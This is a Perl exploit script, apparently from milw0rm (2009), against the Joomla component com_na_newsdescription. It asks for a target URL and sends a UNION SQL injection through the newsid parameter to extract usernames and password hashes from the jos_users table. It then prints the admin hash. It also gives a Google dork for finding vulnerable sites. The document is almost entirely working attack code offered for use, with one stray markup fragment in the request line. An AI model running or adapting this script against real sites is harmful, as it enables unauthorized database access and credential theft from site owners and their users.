#!/usr/bin/perl -w
 
 
#Joomla com_na_newsdescription Sql injection#
########################################
#[~] Author :  EcHoLL
#[~] www.warezturk.org www.tahribat.com
#[~] Greetz : Black_label TURK Godlike Nitrous
 
#[!] Module_Name:  com_na_newsdescription
#[!] Script_Name:  Joomla
#[!] Google_Dork:  inurl:"com_na_newsdescription"
########################################
 
 
system("color FF0000");
system("Nohacking");
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|                 Turkish Securtiy Team                      |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|Joomla Module com_na_newsdescription(show&groupId=)Remote SQL Injection Vuln|\n\n";
print "\t\t|   Coded by: EcHoLL     www.warezturk.org               |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
 
use LWP::UserAgent;
 
print "\nSite ismi Target page:[http://wwww.site.com/path/]: ";
 chomp(my $target=<STDIN>);
 
$column_name="concat(username,0x3a,password)";
$table_name="jos_users";
 
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
 
$host = $target .   "/index.php?option=com_na_newsdescription&task=show&groupId=17377_19&newsid=85790+AND+1=2+UNION+SELECT+".$column_name.",1,2,3,4,5,6,7+from/**/".$table_name."--";< BR>$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
  print "\n[+] Admin Hash : $1\n\n";
  print "#   Tebrikler Exploit Calisti!  #\n\n";
}
else{print "\n[-] Exploit Bulunamadı...\n";
}

# milw0rm.com [2009-01-05]
